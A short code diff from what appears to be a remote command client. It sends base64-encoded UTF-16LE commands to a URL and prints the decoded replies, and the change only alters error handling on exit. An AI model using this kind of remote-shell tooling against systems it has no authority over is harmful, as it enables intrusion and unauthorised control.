@@ -12,8 +12,7 @@ def main():
 			try:
 				requests.get(url + 'exit')
 			except:
-				pass
-			return
+				return
 		else:
 			try:
 				print(b64decode(requests.get(url + urllib.quote( b64encode(cmd.encode('UTF-16LE')), safe='' ) ).text).replace('\x00',''))
